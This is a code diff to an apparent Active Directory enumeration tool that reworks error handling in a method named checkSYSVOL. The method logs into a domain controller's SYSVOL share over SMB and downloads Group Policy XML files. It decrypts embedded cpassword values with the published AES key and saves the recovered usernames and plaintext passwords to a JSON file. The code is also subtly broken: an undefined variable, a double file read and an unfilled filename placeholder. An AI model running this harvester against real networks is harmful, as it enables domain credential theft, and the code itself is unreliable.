@@ -258,53 +258,63 @@ class EnumAD():
     
 
     def checkSYSVOL(self):
+        print('[ .. ] Searching SYSVOL for cpasswords\r')
         cpasswords = {}
-        #try:
-        smbconn = smbconnection.SMBConnection('\\\\{0}\\'.format(self.server), self.server, timeout=5)
-        smbconn.login(self.domuser, self.passwd)
-        dirs = smbconn.listShares()
-        for share in dirs:
-            if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
-                path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
-                paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
-                for dirname in paths:
-                    try:
-                        # Dont want . or ..
-                        subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
-                        for sub in subPath:
-                            if len(sub.get_shortname()) > 2:
-                                paths.append(dirname + '\\' + sub.get_shortname())
-                    except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
-                        continue
+        try:
+            smbconn = smbconnection.SMBConnection('\\\\{0}\\'.format(self.server), self.server, timeout=5)
+            smbconn.login(self.domuser, self.passwd)
+            dirs = smbconn.listShares()
+            for share in dirs:
+                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
+                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
+                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
+                    for dirname in paths:
+                        try:
+                            # Dont want . or ..
+                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
+                            for sub in subPath:
+                                if len(sub.get_shortname()) > 2:
+                                    paths.append(dirname + '\\' + sub.get_shortname())
+                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+                            continue
                 
-                # Compile regexes for username and passwords
-                cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
-                unameRE = re.compile(r'userName=\"([ a-zA-Z0-9/\(\)-]+)\"')
+                    # Compile regexes for username and passwords
+                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
+                    unameRE = re.compile(r'userName=\"([ a-zA-Z0-9/\(\)-]+)\"')
 
-                # Prepare the ciphers based on MSDN article with key and IV
-                cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
+                    # Prepare the ciphers based on MSDN article with key and IV
+                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
                 
-                # Since the first entry is the DC we dont want that
-                for item in paths[1:]:
-                    if '.xml' in item.split('\\')[-1]:
-                        with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
-                            smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
-                        with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
-                            try:
-                                passwdMatch = cpassRE.findall(f.read())
-                                for passwd in passwdMatch:
-                                    unameMatch = unameRE.findall(f.read())
-                                    for usr in unameMatch:
-                                        padding = '=' * (4 - len(hit) % 4) 
-                                        cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip()
-                            except (UnicodeDecodeError, AttributeError) as e:
-                                continue
-        print(cpasswords)
+                    # Since the first entry is the DC we dont want that
+                    for item in paths[1:]:
+                        if '.xml' in item.split('\\')[-1]:
+                            with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
+                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
+                            with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
+                                try:
+                                    passwdMatch = cpassRE.findall(f.read())
+                                    for passwd in passwdMatch:
+                                        unameMatch = unameRE.findall(f.read())
+                                        for usr in unameMatch:
+                                            padding = '=' * (4 - len(hit) % 4) 
+                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip()
+                                except (UnicodeDecodeError, AttributeError) as e:
+                                    continue
 
-        #except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
-        #    print('[ ' + colored('NOT OK', 'red') +' ] Some error occoured while searching SYSVOL'.format(self.server))
-        #else:
-        #    smbconn.close()
+            if len(cpasswords.keys()) > 0:
+                with open('{0}-cpasswords.json', 'w') as f:
+                    json.dump(cpasswords, f)
+
+            if len(cpasswords.keys()) == 1:
+                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpassword in a GPO on SYSVOL share'.format(len(cpasswords.keys())))
+            else:
+                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpasswords in GPOs on SYSVOL share'.format(len(cpasswords.keys())))
+
+
+        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+            print('[ ' + colored('NOT OK', 'red') +' ] Some error occoured while searching SYSVOL'.format(self.server))
+        else:
+            smbconn.close()
 
 
     def splitJsonArr(self, arr):
